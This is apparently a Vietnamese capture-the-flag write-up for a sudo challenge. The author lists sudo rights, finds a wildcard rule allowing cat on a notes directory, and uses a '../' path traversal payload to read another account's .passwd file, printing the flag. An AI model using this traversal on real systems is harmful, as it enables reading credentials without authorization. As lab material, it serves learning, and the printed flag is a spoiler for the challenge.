# Solve

- Truy cập vào hệ thống và thấy cây thư mục như sau:
```bash
app-script-ch1@challenge02:~$ tree .
.
├── ch1cracked [error opening dir]
├── notes
│   └── shared_notes
└── readme.md

2 directories, 2 files
app-script-ch1@challenge02:~$
```
- Với quyền hiện tại thì chỉ có thể đọc được nội dung của file readme.md
- Vì tên bài có liên quan đến sudo, nên dùng câu lệnh `sudo -l` để check xem.

```bash
app-script-ch1@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
app-script-ch1@challenge02:~$
```
- Vậy là có thể thực thi lệnh `/bin/cat /challenge/app-script/ch1/notes/*` với quyền của `app-script-ch1-cracked` để đọc được nội dung của tất cả các file trong thư mục notes.
- Ở đây, có thể tận dụng đường dẫn để nó có thể đọc được nội dung của file `.passwd` trong thư mục `ch1cracked` bằng payload như sau:
`sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd`
- Kết quả:
```bash
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
b3_c4r3ful_w1th_sud0
app-script-ch1@challenge02:~$
```

### 🚩Flag: `b3_c4r3ful_w1th_sud0`